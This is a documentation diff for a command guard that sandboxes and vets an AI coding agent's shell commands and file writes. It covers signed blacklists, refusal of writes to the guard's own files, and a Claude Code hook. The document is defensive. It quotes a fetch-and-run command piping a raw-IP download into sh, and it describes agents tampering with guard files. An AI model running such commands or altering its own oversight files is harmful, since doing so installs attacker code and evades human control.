@@ -296,7 +296,14 @@ key under cigo's own label. A list changed by anything but `cigo blacklist`
 does not verify: the run says so (`E587`), and its entries still count
 together with the last copy of it that verified. Taking an entry out of the
 file therefore lets nothing through, until you sign the change with `cigo
-blacklist reload`, which shows what changed and is refused under CI. Inside
+blacklist reload`, which shows what changed and is refused under CI. The
+last list that verified is also kept in the tin (`cig tin keep`, cig
+1.14.0), for the folder it was kept from, and each keep is a line in the
+ledger: delete the list and its
+signature together, or cigo's own copy too, and its entries still count in
+full from the tin, said on every guarded call (`E588`) until `cigo blacklist
+reload` puts the file back. A missing or emptied list never takes entries
+out; only `remove` and `reload` do. Inside
 cig's box the key folder is empty, so a task cannot sign a list. An expired
 entry stays listed and no longer refuses anything. Running something
 blacklisted anyway, and the built-in list cigo will ship, come with #62's
@@ -422,10 +429,28 @@ At `guard_scope agents`, every shell command an agent runs goes through
 `cigo agent run`:
 
 1. It is read first: the static read's rules and your blacklist for any
-   URL it names.
-2. It runs in cig's box over the project on Linux, so what it changes there
-   comes back with undo. The project's manifests and lockfiles are kept in
-   the tin first on every OS.
+   URL it names. A command that would change the guard's own files is
+   refused outright (`E897`, below).
+2. On Linux it runs in cig's **contained** box, the one the rehearsal uses:
+   what it changes in the project comes back with undo, and what it writes
+   in your home is held and judged by where it landed:
+   - **the guard's own files** (Claude Code's settings where the hook
+     lives, `~/.config/cigscript`, cig's state and the tin, cigo's folder
+     and the shims, cig's and cigo's own install folders): refused, `E897`,
+     and never applied, approval or not;
+   - **a shell's startup file, a git hook, an autostart entry, a
+     credential file**: nothing of the command is applied, and it waits
+     for a person (`E894`); approved, the same command run again lands;
+   - **anything else in your home** (a tool's cache, its own config):
+     applied as it was, and named after the output.
+
+   Its network is the registries every toolchain's footprint names and the
+   project's own git remotes; a host outside them is refused, and a command
+   that failed for it waits for a person, who approves it with the hosts
+   named. Called from your home folder itself, the box takes it all the
+   same. Where the contained box cannot be had (not Linux, root, no user
+   namespaces), the plain box runs it and says so. The project's manifests
+   and lockfiles are kept in the tin first on every OS.
 3. It is recorded as a run tagged with the agent and its session.
 
 The verdict decides who answers:
@@ -474,16 +499,41 @@ everything my AI did this afternoon" is `cigo agent undo --since=4h --yes`.
 
 **Claude Code.** `cigo guard scope agents --agents=claude-code` shows the
 entry it would add to `~/.claude/settings.json`, and `--yes` adds it,
-keeping everything else in the file: a `PreToolUse` hook for the Bash tool,
-`cigo agent hook claude-code`. The hook denies a critical command and an
-unapproved high one, with the reason Claude reads. Any other command is
-rewritten to run through `cigo agent run`, the rest of the call kept as it
-was. Claude Code then checks its own permission rules against the
+keeping everything else in the file: a `PreToolUse` hook for the Bash tool
+and the file tools that write without a shell (Write, Edit, MultiEdit,
+NotebookEdit), `cigo agent hook claude-code`. The hook denies a critical
+command and an unapproved high one, with the reason Claude reads. Any other
+command is rewritten to run through `cigo agent run`, the rest of the call
+kept as it was. A file tool is judged by the path it would write (`~`
+expanded, links followed) and the text it would put there: the guard's own
+files are denied (`E897`); a startup file, a git hook, an autostart entry, a
+folder on `PATH`, or text rated high waits for a person (`E894`, then the
+same change again); text rated critical is denied; a write in the project
+goes ahead, and one elsewhere in your home goes ahead and is logged under
+the agent's session. An entry from an older cigo is brought up to date in
+place. cigo keeps its word on the hook in the tin as well: `cigo guard`,
+`cigo doctor` and every guarded call check the entry is still there, and say
+so when it was taken out or changed (`E897`); `cigo guard scope agents
+--agents=claude-code --yes` puts it back. Claude Code then checks its own permission rules against the
 rewritten command, so allow and deny rules written for plain commands
 (`Bash(npm test)`) no longer match it: it asks you instead, unless the
 session's mode allows the call. A settings file that is a symbolic link
 (kept in a repository) is not rewritten; cigo prints the entry to add by
 hand. `cigo guard uninstall` takes the entry out again.
+
+A rehearsal that finds nothing is not called clean until cig's box can
+report what the code read and which connections it tried (CigScript #106):
+it says so (`E898`), rates low (it runs where low runs), and keeps nothing,
+so the same bytes are rehearsed again. A script is read as well as
+rehearsed, with the files it runs from its own folder (`node ./x.js`,
+`python helper.py`, `sh ./y.sh`, `source ./z`), and the read joins the
+pieces a JavaScript file builds at run time (char codes, `'a' + 'b'`, an
+array of literals joined) before the rules see it. A rehearsal whose
+install failed with nothing found could not judge: it says so, exits 1,
+and keeps nothing. A fetch-and-run from a raw address (`curl
+http://45.12.0.7/x | sh`, the decimal and hex forms too) is critical
+wherever it is read: a task, a shim's package, `run-url`'s script, an
+agent's command.
 
 ### The rehearsal: the dry run is the real run
 
